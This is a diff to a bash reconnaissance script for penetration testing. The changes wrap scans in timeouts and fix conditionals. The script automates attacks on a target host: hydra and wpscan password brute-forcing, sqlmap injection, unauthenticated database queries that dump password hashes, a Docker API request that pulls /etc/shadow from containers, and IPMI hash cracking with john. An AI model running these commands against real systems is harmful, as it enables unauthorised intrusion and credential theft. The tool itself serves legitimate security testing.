@@ -1,5 +1,5 @@
 #!/bin/bash
-# 20180523 Kirby
+# 20180524 Kirby
 
 umask 077
 
@@ -180,9 +180,13 @@ function MAIN()
             # check for SSL/TLS
             if [[ $protocol == 'tcp' ]] \
             && echo "... testing $port for ssl/tls with openssl" \
-            && echo quit|timeout --kill-after=10 --foreground 30 openssl s_client -showcerts -connect ${TARGET}:${port} 2>/dev/null |grep CERTIFICATE >/dev/null 2>&1
+            && echo quit|timeout --kill-after=10 --foreground 30 \
+                openssl s_client -showcerts -connect ${TARGET}:${port} 2>/dev/null \
+                |grep -q CERTIFICATE 
             then
-                echo quit|timeout --kill-after=10 --foreground 30 openssl s_client -showcerts -connect ${TARGET}:${port} > "$RECONDIR"/${TARGET}.${port}.certificate 2>&1
+                echo quit|timeout --kill-after=10 --foreground 30 \
+                    openssl s_client -showcerts -connect ${TARGET}:${port} \
+                    > "$RECONDIR"/${TARGET}.${port}.certificate 2>&1
                 ssl=1
                 proto="https"
             else
@@ -269,8 +273,7 @@ function MAIN()
         
             # nfs
             if [[ $protocol == 'tcp' ]] \
-            && [[ $service =~ mountd ]] \
-            || [[ $service =~ nfs ]] 
+            && [[ $service =~ mountd || $service =~ nfs ]] 
             then
                 echo "starting nfsScan"
                 echo "... outputs $RECONDIR/${TARGET}.showmount-e if anything found"
@@ -338,8 +341,7 @@ function MAIN()
             # cifs/smb
             if [[ $protocol == 'tcp' ]] \
             && [[ $port == '445' ]] \
-            && [[ $service == 'microsoft-ds' ]] \
-            || [[ $service == 'netbios-ssn' ]] 
+            && [[ $service == 'microsoft-ds' || $service == 'netbios-ssn' ]] 
             then
                 echo "starting smbScan"
                 echo "... outputs $RECONDIR/${TARGET}.smbshares"
@@ -490,10 +492,6 @@ function MAIN()
         echo "... outputs $RECONDIR/${TARGET}.http.msf"
         msfHttpScan &
     
-        echo "starting wigScan"
-        echo "... outputs $RECONDIR/${TARGET}.wig"
-        wigScan &
-    
         echo "starting routersploitScan"
         echo "... outputs $RECONDIR/${TARGET}.routersploit"
         routersploitScan &
@@ -550,6 +548,7 @@ function MAIN()
 
         echo "starting scanURLs"
         echo "... outputs $RECONDIR/${TARGET}.whatweb"
+        echo "... outputs $RECONDIR/${TARGET}.wig"
         echo "... outputs $RECONDIR/${TARGET}.wpscan if anything found"
         echo "... outputs $RECONDIR/${TARGET}.joomscan if anything found"
         echo "... outputs $RECONDIR/${TARGET}.fimap if anything found"
@@ -702,6 +701,7 @@ function buildEnv()
             /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt \
             /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
             /usr/share/wordlists/metasploit/idrac_default_user.txt \
+            /usr/share/wordlists/metasploit/http_default_users.txt \
             >> "$RECONDIR"/tmp/users.tmp 
 
         cat /usr/share/seclists/Passwords/Common-Credentials/best110.txt \
@@ -711,7 +711,6 @@ function buildEnv()
             /usr/share/wordlists/metasploit/adobe_top100_pass.txt \
             /usr/share/wordlists/metasploit/db2_default_pass.txt \
             /usr/share/wordlists/metasploit/default_pass_for_services_unhash.txt \
-            /usr/share/wordlists/metasploit/hci_oracle_passwords.csv \
             /usr/share/wordlists/metasploit/http_default_pass.txt \
             /usr/share/wordlists/metasploit/mirai_pass.txt \
             /usr/share/wordlists/metasploit/multi_vendor_cctv_dvr_pass.txt \
@@ -1012,7 +1011,8 @@ function routersploitScan()
         done
     done
 
-    cat "$RECONDIR"/tmp/routersploitscript |routersploit 2>&1 \
+    cat "$RECONDIR"/tmp/routersploitscript \
+        |timeout --kill-after 10 --foreground 1400 routersploit 2>&1 \
         |sed -r "s/\x1B\[(([0-9]{1,2})?(;)?([0-9]{1,2})?)?[m,K,H,f,J]//g" \
         > "$RECONDIR"/${TARGET}.routersploit 2>&1
 
@@ -1041,9 +1041,11 @@ function nfsScan()
     local output
     local i
 
-    ( timeout --kill-after=10 --foreground 90 showmount -e ${TARGET} >"$RECONDIR"/${TARGET}.showmount-e 2>&1 \
+    ( timeout --kill-after=10 --foreground 90 \
+        showmount -e ${TARGET} >"$RECONDIR"/${TARGET}.showmount-e 2>&1 \
         || rm -f "$RECONDIR"/${TARGET}.showmount-e >/dev/null 2>&1 ) &
-    ( timeout --kill-after=10 --foreground 90 showmount -a ${TARGET} >"$RECONDIR"/${TARGET}.showmount-a 2>&1 \
+    ( timeout --kill-after=10 --foreground 90 \
+        showmount -a ${TARGET} >"$RECONDIR"/${TARGET}.showmount-a 2>&1 \
         || rm -f "$RECONDIR"/${TARGET}.showmount-a >/dev/null 2>&1 ) &
 
 
@@ -1195,11 +1197,13 @@ function dnsScan()
         IFS=$'\n'
         if [[ ${#subnet[@]} -eq 2 ]]
         then
-            timeout --kill-after=10 --foreground 1800 dnsrecon -n $TARGET -r ${subnet[1]}.${subnet[0]}.0.0/16 \
+            timeout --kill-after=10 --foreground 1800 \
+                dnsrecon -n $TARGET -r ${subnet[1]}.${subnet[0]}.0.0/16 \
                 >>"$RECONDIR"/${TARGET}.dnsreconptr.${subnet[1]}.${subnet[0]} 2>&1 
         elif [[ ${#subnet[@]} -eq 3 ]]
         then
-            timeout --kill-after=10 --foreground 1800 dnsrecon -n $TARGET -r ${subnet[2]}.${subnet[1]}.${subnet[0]}.0/24 \
+            timeout --kill-after=10 --foreground 1800 \
+                dnsrecon -n $TARGET -r ${subnet[2]}.${subnet[1]}.${subnet[0]}.0/24 \
                 >>"$RECONDIR"/${TARGET}.dnsreconptr.${subnet[2]}.${subnet[1]}.${subnet[0]} 2>&1 
         fi
 
@@ -1225,13 +1229,16 @@ function rsyncScan()
     local port=$1
     local share
 
-    timeout --kill-after=10 --foreground 90 rsync --list-only --port=$port rsync://$TARGET >>"$RECONDIR"/${TARGET}.${port}.rsync 2>&1 \
+    timeout --kill-after=10 --foreground 90 \
+        rsync --list-only --port=$port rsync://$TARGET \
+            >>"$RECONDIR"/${TARGET}.${port}.rsync 2>&1 \
         || rm -f "$RECONDIR"/${TARGET}.${port}.rsync >/dev/null 2>&1
     if [[ -f  "$RECONDIR"/${TARGET}.${port}.rsync ]]
     then
         for share in $(cat "$RECONDIR"/${TARGET}.${port}.rsync)
         do
-            timeout --kill-after=10 --foreground 600 rsync --list-only --port=${port%%/*} rsync://$TARGET/$share \
+            timeout --kill-after=10 --foreground 600 \
+                rsync --list-only --port=${port%%/*} rsync://$TARGET/$share \
                 >>"$RECONDIR"/${TARGET}.${port}.rsync-$share 2>&1 
         done
     fi
@@ -1251,15 +1258,26 @@ function smbScan()
     do
         echo "####################" >>"$RECONDIR"/${TARGET}.smbdirs
         echo "//$TARGET/$share" >>"$RECONDIR"/${TARGET}.smbdirs
-        timeout --kill-after=10 --foreground 90 smbclient -N -c dir //$TARGET/"$share" >>"$RECONDIR"/${TARGET}.smbdirs 2>&1
+        timeout --kill-after=10 --foreground 90 \
+            smbclient -N -c dir //$TARGET/"$share" >>"$RECONDIR"/${TARGET}.smbdirs 2>&1
         echo "" >>"$RECONDIR"/${TARGET}.smbdirs
         echo "" >>"$RECONDIR"/${TARGET}.smbdirs
     done
-    for cmd in srvinfo dsgetdcinfo ntsvcs_getversion wkssvc_wkstagetinfo wkssvc_getjoininformation wkssvc_enumeratecomputernames dfsenum netshareenumall enumdomusers enumdomgroups
+    for cmd in srvinfo \
+        dsgetdcinfo \
+        ntsvcs_getversion \
+        wkssvc_wkstagetinfo \
+        wkssvc_getjoininformation \
+        wkssvc_enumeratecomputernames \
+        dfsenum \
+        netshareenumall \
+        enumdomusers \
+        enumdomgroups
     do
         echo "####################" >>"$RECONDIR"/${TARGET}.rpcclient
         echo "cmd: $cmd" >>"$RECONDIR"/${TARGET}.rpcclient
-        timeout --kill-after=10 --foreground 90 rpcclient -U "" $TARGET -N -c $cmd >>"$RECONDIR"/${TARGET}.rpcclient 2>&1
+        timeout --kill-after=10 --foreground 90 \
+            rpcclient -U "" $TARGET -N -c $cmd >>"$RECONDIR"/${TARGET}.rpcclient 2>&1
         echo "" >>"$RECONDIR"/${TARGET}.rpcclient
         echo "" >>"$RECONDIR"/${TARGET}.rpcclient
     done
@@ -1274,27 +1292,31 @@ function mysqlScan()
     local port=$1
     local db
 
-    echo "show databases" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
-    timeout --kill-after=10 --foreground 60 mysql -E -u root -e 'show databases;' --connect-timeout=30 -h $TARGET \
+    echo "show databases" >> "$RECONDIR"/${TARGET}.mysql.$port
+    timeout --kill-after=10 --foreground 60 \
+        mysql -E -u root -e 'show databases;' --connect-timeout=30 -h $TARGET \
         >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
 
 
     for db in $(cat "$RECONDIR"/${TARGET}.mysql.$port |awk '/^Database:/ {print $2}')
     do
-        echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port
         echo "Tables from database $db" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
-        timeout --kill-after=10 --foreground 60 mysql -E -u root -D "$db" -e 'show tables;' --connect-timeout=30 -h $TARGET \
+        timeout --kill-after=10 --foreground 60 \
+            mysql -E -u root -D "$db" -e 'show tables;' --connect-timeout=30 -h $TARGET \
             |grep -v 'row *' >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
     done
 
-    echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
-    echo "show full processlist;" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
-    timeout --kill-after=10 --foreground 60 mysql -E -u root -e 'show full processlist;' --connect-timeout=30 -h $TARGET \
+    echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port
+    echo "show full processlist;" >> "$RECONDIR"/${TARGET}.mysql.$port 
+    timeout --kill-after=10 --foreground 60 \
+        mysql -E -u root -e 'show full processlist;' --connect-timeout=30 -h $TARGET \
         >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
 
-    echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
-    echo "select host,user,password from mysql.user;" >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
-    timeout --kill-after=10 --foreground 60 mysql -E -u root -e 'select host,user,password from mysql.user;' --connect-timeout=30 -h $TARGET \
+    echo "$BORDER" >> "$RECONDIR"/${TARGET}.mysql.$port
+    echo "select host,user,password from mysql.user;" >> "$RECONDIR"/${TARGET}.mysql.$port
+    timeout --kill-after=10 --foreground 60 \
+        mysql -E -u root -e 'select host,user,password from mysql.user;' --connect-timeout=30 -h $TARGET \
         >> "$RECONDIR"/${TARGET}.mysql.$port 2>&1
 
     return 0
@@ -1378,21 +1400,21 @@ function postgresqlScan()
 
     for db in $(cat "$RECONDIR"/${TARGET}.postgresql.$port |awk '/^Name/ {print $3}')
     do
-        echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
-        echo "Tables from database $db" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port
+        echo "Tables from database $db" >> "$RECONDIR"/${TARGET}.postgresql.$port
         timeout --kill-after=10 --foreground 60 \
             psql -w -h $TARGET -p $port -U postgres -x -c 'SELECT * FROM pg_catalog.pg_tables;' -d $db \
             >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
     done
 
-    echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
-    echo "select * from pg_stat_activity" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
+    echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port
+    echo "select * from pg_stat_activity" >> "$RECONDIR"/${TARGET}.postgresql.$port
     timeout --kill-after=10 --foreground 60 \
         psql -w -h $TARGET -p $port -U postgres -x -c 'select * from pg_stat_activity;' \
         >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
 
-    echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
-    echo "select * from pg_catalog.pg_shadow" >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
+    echo "$BORDER" >> "$RECONDIR"/${TARGET}.postgresql.$port
+    echo "select * from pg_catalog.pg_shadow" >> "$RECONDIR"/${TARGET}.postgresql.$port
     timeout --kill-after=10 --foreground 60 \
         psql -w -h $TARGET -p $port -U postgres -x -c 'select * from pg_catalog.pg_shadow;' \
         >> "$RECONDIR"/${TARGET}.postgresql.$port 2>&1
@@ -1408,28 +1430,35 @@ function dockerScan()
     local proto=$2
     local id
 
-    timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:$port/info 2>/dev/null|jq -M . \
+    timeout --kill-after=10 --foreground 60 \
+        curl -k -s ${proto}://${TARGET}:$port/info 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockerinfo.${port} 2>&1
 
-    timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:$port/networks 2>/dev/null|jq -M . \
+    timeout --kill-after=10 --foreground 60 \
+        curl -k -s ${proto}://${TARGET}:$port/networks 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockernetworks.${port} 2>&1
 
-    timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:$port/containers/json 2>/dev/null|jq -M . \
+    timeout --kill-after=10 --foreground 60 \
+        curl -k -s ${proto}://${TARGET}:$port/containers/json 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockercontainers.${port} 2>&1
 
     for id in $(grep '"Id": ' "$RECONDIR"/${TARGET}.dockercontainers.${port} |cut -d'"' -f4)
     do
-        timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/top 2>/dev/null|jq -M . \
+        timeout --kill-after=10 --foreground 60 \
+            curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/top 2>/dev/null|jq -M . \
             >> "$RECONDIR"/dockertop.${port}.${id}
-        timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/changes 2>/dev/null|jq -M . \
+        timeout --kill-after=10 --foreground 60 \
+            curl -k -s ${proto}://${TARGET}:${port}/containers/${id}/changes 2>/dev/null|jq -M . \
             >> "$RECONDIR"/dockerchanges.${port}.${id}
-        timeout --kill-after=10 --foreground 60 curl -k -s "${proto}://${TARGET}:${port}/containers/${id}/archive?path=/etc/shadow" \
+        timeout --kill-after=10 --foreground 60 \
+            curl -k -s "${proto}://${TARGET}:${port}/containers/${id}/archive?path=/etc/shadow" \
             2>/dev/null|tar xf - -O \
             >> "$RECONDIR"/dockershadow.${port}.${id} 2>/dev/null
 
     done
 
-    timeout --kill-after=10 --foreground 60 curl -k -s ${proto}://${TARGET}:${port}/v2/_catalog 2>/dev/null|jq -M . \
+    timeout --kill-after=10 --foreground 60 \
+        curl -k -s ${proto}://${TARGET}:${port}/v2/_catalog 2>/dev/null|jq -M . \
         >> "$RECONDIR"/${TARGET}.dockerepo.${port} 2>&1
 
     return 0
@@ -1715,9 +1744,10 @@ function getHeaders()
 
     for url in $(cat "$RECONDIR"/${TARGET}.urls)
     do 
-        echo "$BORDER" >> "$RECONDIR"/${TARGET}.headers 2>&1
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.headers
         echo "$url" >> "$RECONDIR"/${TARGET}.headers
-        timeout --kill-after=10 --foreground 30 wget -q -O /dev/null --no-check-certificate -S  -D $TARGET --method=OPTIONS "$url" \
+        timeout --kill-after=10 --foreground 30 \
+            wget -q -O /dev/null --no-check-certificate -S  -D $TARGET --method=OPTIONS "$url" \
             >> "$RECONDIR"/${TARGET}.headers 2>&1
     done
 
@@ -1765,16 +1795,16 @@ function hydraScanURLs()
         mkdir -p "$RECONDIR"/${TARGET}.hydra >/dev/null 2>&1
 
         # Test with separate user/pass files
-        echo "TESTING $url"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
-        echo "$BORDER"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
+        echo "TESTING $url"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile}
+        echo "$BORDER"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile}
         timeout --kill-after=10 --foreground 900 hydra -I -L "$RECONDIR"/tmp/users.lst \
             -P "$RECONDIR"/tmp/passwds.lst -e nsr \
             -u -t 3 $sslflag -s $port $TARGET http-get "$path" \
             >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
 
         # Test with default creds from routersploit and metasploit
-        echo "TESTING $url"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
-        echo "$BORDER"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile} 2>&1
+        echo "TESTING $url"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile}
+        echo "$BORDER"  >> "$RECONDIR"/${TARGET}.hydra/${hydrafile}
         timeout --kill-after=10 --foreground 900 hydra -I \
             -C "$RECONDIR"/tmp/userpass.lst \
             -u -t 3 $sslflag -s $port $TARGET http-get "$path" \
@@ -1797,14 +1827,14 @@ function sqlmapScan()
 
     for url in $(grep '?' "$RECONDIR"/${TARGET}.spider 2>/dev/null ; awk '/^URL: / {print $2}' "$RECONDIR"/${TARGET}.mech-dump 2>/dev/null)
     do
-        echo $BORDER >> "$RECONDIR"/tmp/${TARGET}.sqlmap.raw 2>&1
-        echo "# TESTING $url" >> "$RECONDIR"/tmp/${TARGET}.sqlmap.raw 2>&1
+        echo $BORDER >> "$RECONDIR"/tmp/${TARGET}.sqlmap.raw
+        echo "# TESTING $url" >> "$RECONDIR"/tmp/${TARGET}.sqlmap.raw
         timeout --kill-after=10 --foreground 300 \
-            sqlmap --forms --random-agent --batch --flush-session -o --threads=5 -a --technique=BEUSQ -u "$url" \
+            sqlmap --forms --random-agent --batch --flush-session -o --threads=5 -a --technique=BEUSQ -u "$url" 2>&1 \
             | tail -n +7 \
             | strings -a \
-            >> "$RECONDIR"/tmp/${TARGET}.sqlmap.raw 2>&1
-        echo $BORDER >> "$RECONDIR"/tmp/${TARGET}.sqlmap.raw 2>&1
+            >> "$RECONDIR"/tmp/${TARGET}.sqlmap.raw 
+        echo $BORDER >> "$RECONDIR"/tmp/${TARGET}.sqlmap.raw 
 
         # Update $TARGET.sqlmap each round in case we go over time limit and die
         cat "$RECONDIR"/tmp/${TARGET}.sqlmap.raw 2>/dev/null \
@@ -2053,8 +2083,9 @@ function fuzzURLs()
             >> ${file}.1 2>&1
             mv -f ${file}.1 ${file} 2>&1
 
-        # POST wfuzz does multiline.  This will compact the html so we can use the ignore feature.
-        if egrep -q '^<td>[[:space:]]?[[:digit:]]+L</td>$' "$file"
+        # POST wfuzz does multiline.  
+        # This will compact the html so we can use the ignore feature.
+        if egrep -q '^<td>[[:space:]]*[[:digit:]]+L</td>$' "$file"
         then
             IFS=$'\n'
             inside=0
@@ -2265,19 +2296,34 @@ function scanURLs()
         fi
     done
 
+    for url in $(cat "$RECONDIR"/${TARGET}.baseurls 2>/dev/null)
+    do
+        echo "Running wig on $url"
+        echo "... outputs $RECONDIR/$TARGET.wig"
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.wig 
+        echo "Testing $url" >> "$RECONDIR"/${TARGET}.wig 
+        timeout --kill-after=10 --foreground 900 \
+            wig -q -a -d $url 2>&1 |sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" \
+            >> "$RECONDIR"/${TARGET}.wig 
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.wig 
+    done
+
     # run wpscan on first found wordpress
     for url in $(egrep -i 'wordpress|/wp' "$RECONDIR"/${TARGET}.whatweb 2>/dev/null |head -1 |awk '{print $1}')
     do
         echo "Running wpscan on $url"
-        echo "$BORDER" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
-        echo "URL: $url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
-        timeout --kill-after=10 --foreground 900 wpscan -t 10 --follow-redirection --disable-tls-checks -e \
+        echo "... outputs $RECONDIR/$TARGET.wpscan"
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.wpscan
+        echo "URL: $url" >> "$RECONDIR"/${TARGET}.wpscan
+        timeout --kill-after=10 --foreground 900 \
+            wpscan -t 10 --follow-redirection --disable-tls-checks -e \
             --no-banner --no-color --batch --url "$url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
 
         echo "Running wpscan admin crack on $url"
-        echo "$BORDER" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
-        echo "CRACKING ADMIN FOR URL: $url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1 
-        timeout --kill-after=10 --foreground 900 wpscan -t 3 --disable-tls-checks --wordlist "$RECONDIR"/tmp/passwds.lst \
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.wpscan
+        echo "CRACKING ADMIN FOR URL: $url" >> "$RECONDIR"/${TARGET}.wpscan
+        timeout --kill-after=10 --foreground 900 \
+            wpscan -t 3 --disable-tls-checks --wordlist "$RECONDIR"/tmp/passwds.lst \
             --username admin --url "$url" >> "$RECONDIR"/${TARGET}.wpscan 2>&1
     done
 
@@ -2285,8 +2331,9 @@ function scanURLs()
     for url in $(grep -i joomla "$RECONDIR"/${TARGET}.whatweb 2>/dev/null |head -1 |awk '{print $1}')
     do
         echo "Running joomscan on $url"
-        echo "$BORDER" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
-        echo "URL: $url" >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
+        echo "... outputs $RECONDIR/$TARGET.joomscan"
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.joomscan
+        echo "URL: $url" >> "$RECONDIR"/${TARGET}.joomscan
         timeout --kill-after=10 --foreground 900 joomscan -pe -u "$url" \
             |sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" \
             >> "$RECONDIR"/${TARGET}.joomscan 2>&1 
@@ -2296,9 +2343,11 @@ function scanURLs()
     for url in $(egrep -i '\.php$' "$RECONDIR"/${TARGET}.urls |awk '{print $1}')
     do
         echo "Running fimap on $url"
-        echo "$BORDER" >> "$RECONDIR"/${TARGET}.fimap 2>&1 
-        echo "URL: $url" >> "$RECONDIR"/${TARGET}.fimap 2>&1 
-        timeout --kill-after=10 --foreground 300 fimap --force-run -4 -u "$url" 2>&1 \
+        echo "... outputs $RECONDIR/$TARGET.fimap"
+        echo "$BORDER" >> "$RECONDIR"/${TARGET}.fimap
+        echo "URL: $url" >> "$RECONDIR"/${TARGET}.fimap
+        timeout --kill-after=10 --foreground 300 \
+            fimap --force-run -4 -u "$url" 2>&1 \
             |egrep -v '^fimap |^Another fimap|^:: |^Starting harvester|^No links found|^AutoAwesome is done' \
             >> "$RECONDIR"/${TARGET}.fimap
     done
@@ -2321,7 +2370,7 @@ function memcacheScan()
     echo "run" >> $cmdfile
     echo "exit" >> $cmdfile
 
-    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.msf.memcached.${port}.out >/dev/null 2>&1
+    timeout --kill-after=10 --foreground 3600 /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.msf.memcached.${port}.out >/dev/null 2>&1
 
     # strip hex and convert newlines to real newlines
     perl -pi -e 's|\\r\\n|\n|g' "$RECONDIR"/${TARGET}.msf.memcached.${port}.out 
@@ -2344,11 +2393,11 @@ function ipmiScan()
     echo "run" >> $cmdfile
     echo "exit" >> $cmdfile
 
-    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile >"$RECONDIR"/tmp/msf.ipmi.out 2>&1
+    timeout --kill-after=10 --foreground 3600 /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile >"$RECONDIR"/tmp/msf.ipmi.out 2>&1
 
     if [[ -f $RECONDIR/${TARGET}.ipmi.john ]]
     then
-        john --wordlist=$RECONDIR/tmp/passwds.lst --rules=Single $RECONDIR/${TARGET}.ipmi.john \
+        timeout --kill-after=10 --foreground 14400 john --wordlist=$RECONDIR/tmp/passwds.lst --rules=Single $RECONDIR/${TARGET}.ipmi.john \
             >"$RECONDIR"/tmp/ipmi.john.out 2>&1
         john --show $RECONDIR/${TARGET}.ipmi.john >$RECONDIR/${TARGET}.ipmi.john.cracked 2>&1
     fi
@@ -2380,7 +2429,7 @@ function rmiScan()
     done
     echo "exit" >> "$cmdfile"
 
-    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.rmi >/dev/null 2>&1
+    timeout --kill-after=10 --foreground 3600 /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.rmi >/dev/null 2>&1
 
     return 0
 }
@@ -2399,7 +2448,7 @@ function msfHttpScan()
     for msfscan in $(/usr/share/metasploit-framework/msfconsole -q -n \
         -x 'search auxiliary/scanner/http/; exit' \
         |awk '{print $1}' \
-        |grep 'auxiliary/scanner/http/'
+        |grep 'auxiliary/scanner/http/' \
         |egrep -v 'brute|udp_amplification|_amp$|dir_webdav_unicode_bypass|http/xpath' \
         )
     do
@@ -2435,7 +2484,7 @@ function msfHttpScan()
     done
     echo "exit" >> "$cmdfile"
 
-    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.http.msf >/dev/null 2>&1
+    timeout --kill-after=10 --foreground 28800 /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.http.msf >/dev/null 2>&1
 
     return 0
 }
@@ -2489,7 +2538,7 @@ function msfSapScan()
     done
     echo "exit" >> "$cmdfile"
 
-    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.sap.msf >/dev/null 2>&1
+    timeout --kill-after=10 --foreground 14400 /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.sap.msf >/dev/null 2>&1
 
     return 0
 }
@@ -2508,7 +2557,7 @@ function juniperScan()
     echo "run" >> "$cmdfile"
     echo "exit" >> "$cmdfile"
 
-    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.juniper >/dev/null 2>&1
+    timeout --kill-after=10 --foreground 3600 /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.juniper >/dev/null 2>&1
 
     return 0
 }
@@ -2553,7 +2602,8 @@ function ciscoScan()
     done
     echo "exit" >> "$cmdfile"
 
-    /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.cisco >/dev/null 2>&1
+    timeout --kill-after=10 --foreground 14400 \
+        /usr/share/metasploit-framework/msfconsole -q -n -r $cmdfile -o "$RECONDIR"/${TARGET}.cisco >/dev/null 2>&1
 
     return 0
 }
@@ -2564,7 +2614,8 @@ function tnscmd10gScan()
 {
     local port=$1
 
-    tnscmd10g -h ${TARGET} -p port >"$RECONDIR"/${TARGET}.oracle.tnscmd10g.$port 2>&1
+    timeout --kill-after=10 --foreground 3600 \
+        tnscmd10g -h ${TARGET} -p port >"$RECONDIR"/${TARGET}.oracle.tnscmd10g.$port 2>&1
 
     return 0
 }
@@ -2596,29 +2647,10 @@ function badKeyScan()
 
         # Run ssh with verbose.  
         # If it gets to the "Sending command", then key was successful
-        if ssh -o "PasswordAuthentication no" -v -p $port -i $key -l $user $TARGET 'uname' 2>&1|grep -q 'Sending command:'
+        if timeout --kill-after=10 --foreground 90 ssh -o "PasswordAuthentication no" -v -p $port -i $key -l $user $TARGET 'uname' 2>&1|grep -q 'Sending command:'
         then
             echo "FOUND KEY WITH $yml" >> $RECONDIR/${TARGET}.ssh.badKeys
         fi
-    done
-
-    return 0
-}
-################################################################################
-
-################################################################################
-function wigScan()
-{
-    local url
-
-    for url in $(cat "$RECONDIR"/${TARGET}.baseurls)
-    do
-        echo "$BORDER" >> "$RECONDIR"/${TARGET}.wig 
-        echo "Testing $url" >> "$RECONDIR"/${TARGET}.wig 
-        wig -q -a -d $url 2>&1 |sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" \
-            >> "$RECONDIR"/${TARGET}.wig 
-        echo "$BORDER" >> "$RECONDIR"/${TARGET}.wig 
-
     done
 
     return 0
